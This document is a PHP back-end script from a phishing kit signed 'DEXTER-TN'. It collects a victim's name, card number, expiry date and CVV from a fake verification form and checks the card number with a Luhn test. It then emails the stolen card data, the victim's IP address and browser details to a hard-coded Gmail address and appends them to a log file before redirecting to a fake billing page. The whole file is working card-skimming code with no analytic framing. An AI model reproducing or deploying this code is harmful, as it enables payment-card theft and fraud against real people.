<?php
session_start();
error_reporting(0);
function generateRandomString($length = 100) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$string = generateRandomString();
$sessionID = $_GET['sessionID'];
$_SESSION['firstName'] = $_POST['firstName'];
$firstName = $_POST['firstName'];
$_SESSION['lastName'] = $_POST['lastName'];
$lastName = $_POST['lastName'];
$_SESSION['cardNumber'] = $_POST['cardNumber'];
$ccNum = $_POST['cardNumber'];
$_SESSION['expireMM'] = $_POST['expireMM'];
$_SESSION['expireYY'] = $_POST['expireYY'];
$_SESSION['cvv'] = $_POST['cvv'];
$cvv = $_POST['cvv'];

function luhn_check($number) {

    // Strip any non-digits (useful for credit card numbers with spaces and hyphens)
    $number=preg_replace('/\D/', '', $number);
  
    // Set the string length and parity
    $number_length=strlen($number);
    $parity=$number_length % 2;
  
    // Loop through each digit and do the maths
    $total=0;
    for ($i=0; $i<$number_length; $i++) {
      $digit=$number[$i];
      // Multiply alternate digits by two
      if ($i % 2 == $parity) {
        $digit*=2;
        // If the sum is two digits, add them together (in effect)
        if ($digit > 9) {
          $digit-=9;
        }
      }
      // Total up the digits
      $total+=$digit;
    }
  
    // If the total mod 10 equals 0, the number is valid
    return ($total % 10 == 0) ? TRUE : FALSE;
  
}

if(luhn_check($ccNum) == ''){
    echo("<script>location.href = 'Verify.php?sessionID=".$sessionID."&error=cardInvalid';</script>");
    exit();
}

if(!is_numeric($cvv)){
    echo("<script>location.href = 'Verify.php?sessionID=".$sessionID."&error=cvv';</script>");
    exit();
}
 
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
if(($_POST['firstName'] != "") AND ($_POST['expireMM'] != "") AND ($_POST['cvv'] != "") AND ($_POST['expireYY'] != "") AND ($_POST['cardNumber'] != "") AND ($_POST['lastName'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "Coded by DEXTER-TN \n";
$message .= "################################ \n";
$message .= "[First Name]:                  ".$_POST['firstName']."\n";
$message .= "[lastName]:                    ".$_POST['lastName']."\n";
$message .= "[Card Number]:                 ".$_POST['cardNumber']."\n";
$message .= "[Exp Month]:                   ".$_POST['expireMM']."\n";
$message .= "[Exp Year]:                    ".$_POST['expireYY']."\n";
$message .= "[CVV]:                         ".$_POST['cvv']."\n";
$message .= "################################ \n";
$message .= "IP:       $ip \n";
$message .= "Time:     $time \n";
$message .= "Agent:    $agent \n";
$message .= "################################ \n";
$message .= " DEXTER V2 \n";
$send = "dextertn216@gmail.com";
$subject = "CC From DEXTER-TN V2 $ip";
$headers = "From: DEXTER-TN V2<info@logs.com>";
mail($send,$subject,$message,$headers);
$MYFILE = "DEXTER/DEXTER-CC.txt";
        $FH = @fopen($MYFILE, 'a+');
        @fwrite($FH, $message);
        @fclose($FH);
echo "<meta http-equiv='refresh' content='0; url=Billing.php?sessionID=$string'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; Billing.php?sessionID=abbr4564eee0031320151313168168646' />";
}

?>